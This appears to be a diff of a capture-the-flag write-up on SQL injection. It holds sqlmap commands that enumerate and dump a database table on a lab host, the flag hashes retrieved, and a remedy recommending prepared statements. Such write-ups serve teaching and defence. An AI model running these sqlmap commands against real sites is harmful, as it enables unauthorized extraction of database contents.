@@ -11,12 +11,13 @@ For this part we will be making use of out terminal. We'll use the same url like
 * sqlmap  -u <a href="http://192.168.43.251/index.php?page=member&id=1&Submit=Submit#">member</a> --columns -D Member_images -T list_mages
 * sqlmap  -u <a href="http://192.168.43.251/index.php?page=member&id=1&Submit=Submit#">member</a> --dump -D Member_images -T list_mages
 > options [Y, Y, D, N]
+
 ## Retrieved Data
 * flag md5 : 1928e8083cf461a51303633093573c46
 * flag sh256: 5d5b09f6dcb2d53a5fffc60c4ac0d55fabdf556069d6631545f42aa6e3500f2e
 
 ## Remedy
-* Similar to direct SQL_Injection this  can be prevented by using prepared statements. Prepared statement will tell that database to look at the input as nothing else but just that, an input. sqlmap simply 
+* Similar to direct SQL_Injection this  can be prevented by using prepared statements. Prepared statement will tell that database to look at the input as nothing else but just that, an input. sqlmap uses similar these vulnerabilities to exploit and so without them it will not work.
 
 # Resources
 * https://www.youtube.com/watch?v=ciNHn38EyRc
